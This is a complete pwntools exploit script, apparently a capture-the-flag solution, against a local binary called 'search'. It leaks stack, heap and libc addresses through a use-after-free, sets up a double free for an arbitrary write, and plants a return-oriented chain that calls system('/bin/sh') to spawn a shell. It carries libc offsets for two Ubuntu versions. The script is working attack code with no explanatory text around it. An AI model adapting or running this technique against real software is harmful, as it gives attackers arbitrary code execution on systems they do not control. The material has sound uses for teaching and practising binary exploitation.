#!/usr/bin/env python3
from pwn import *
import argparse as ap 
context.arch = 'amd64'

pop_rdi = 0x400e23
ret = 0x400761

def recvuntil(s, drop=False):
    ret = p.recvuntil(s)
    print(ret.decode(errors='ignore'))
    if drop == True:
        return ret[:-len(s)]
    return ret

def sendlineafter(after, s):
    ret = p.sendlineafter(after, s)
    print(ret.decode(errors='ignore'))
    log.info('send: {}'.format(s))
    return ret

def sendafter(after, s):
    ret = p.sendafter(after, s)
    print(ret.decode(errors='ignore'))
    log.info('send: {}'.format(s))
    return ret

def sendline(s):
    p.sendline(s)
    log.info('send: {}'.format(s))

def index(size, sentence):
    sendlineafter(b'Quit', '2')
    sendlineafter(b'size:', str(size))
    sendafter(b'sentence:', sentence)

def index_noquit(size, sentence):
    sendline('2')
    sendlineafter(b'size:', str(size))
    sendafter(b'sentence:', sentence)
    
def search(size, word):
    sendlineafter(b'Quit', '1')
    sendlineafter(b'size:', str(size))
    sendafter(b'word:', word)

def delete(option):
    return(sendlineafter(b'(y/n)?', option))

def exit():
    sendlineafter(b'Quit', '3')

def leak_stack():
    while True:
        p.send(b'A' * 0x30)
        ret = recvuntil(b' is not a valid number', drop=True)
        if ret[-0x36:-0x6] == b'A' * 0x30:
            return u64(ret[-0x6:].ljust(8, b'\0'))
            log.info('leak stack: ok')

def leak_heap():
    size = 0x60
    kw = b'qwe'
    payload = b'A' * (size - len(kw) - 1) + b' ' + kw
    index_noquit(size, payload)
    index(size, payload)
    search(len(kw), kw)
    delete('y')
    delete('y')
    
    search(len(kw), b'\0' * len(kw))
    return u64(delete('n').split(maxsplit=2)[2][:8])

def leak_libc():
    size = 0x410
    kw = b'qwerty'
    payload = b'A' * (size - len(kw) - 1) + b' ' + kw
    index_noquit(size, payload)
    index(size, payload)
    search(len(kw), kw)
    delete('y')
    delete('y')
    
    search(len(kw), b'\0' * len(kw))
    base = u64(delete('n').split(maxsplit=2)[2][:8]) - offset
    delete('n')

    # eliminate unsortbin for preventing unexpected bugs
    c = 4
    s = ((b'A' * (size // (c)) + b' ')*(c-1)).ljust(size, b'A')
    index(size, s)
    return base

def create_double_free():
    size = 0x30
    kw = b'qwer'
    payload = b'A' * (size - len(kw) - 1) + b' ' + kw
    index_noquit(size, payload)
    index(size, payload)
    index(size, payload)
    search(len(kw), kw)
    delete('y')
    delete('y')
    delete('y')

    search(len(kw), b'\0' * len(kw))
    delete('y')
    delete('n')

def arbitrary_write(addr, content):
    size = 0x30
    payload1 = p64(addr).ljust(size, b'\0')
    payload2 = content.ljust(size, b'\0')
    garbage = b'A' * size
    index(size, payload1)
    index(size, garbage)
    index(size, garbage)
    index(size, payload2)

parser = ap.ArgumentParser()
parser.add_argument("-uv", type=int, help="target ubuntu version", 
        choices=[16, 18], default=16)
args = parser.parse_args()

if args.uv == 18:
    libc = ELF('./libc-2.27.so')
    offset = 0x3ebca0
else:
    libc = ELF('./libc-2.23.so')
    offset = 0x3c4b78

elf = ELF('./search-bf61fbb8fa7212c814b2607a81a84adf')
p = process('./search-bf61fbb8fa7212c814b2607a81a84adf')

stack = leak_stack()
log.info('stack: {:#x}'.format(stack))

heap = leak_heap()
log.info('heap: {:#x}'.format(heap))

libc.address = leak_libc()
log.info('libc address: {:#x}'.format(libc.address))

create_double_free()

if args.uv == 18:
    payload = flat(ret,
            pop_rdi,
            stack+0x78,
            libc.symbols['system']
            ) + b'/bin/sh\0'
    arbitrary_write(stack+0x58, payload)
else:
    payload = b'a' * 0x6 + flat(
            pop_rdi,
            stack+0x70,
            libc.symbols['system']
            ) + b'/bin/sh\0'
    arbitrary_write(stack+0x42, payload)
    
exit()

p.interactive()
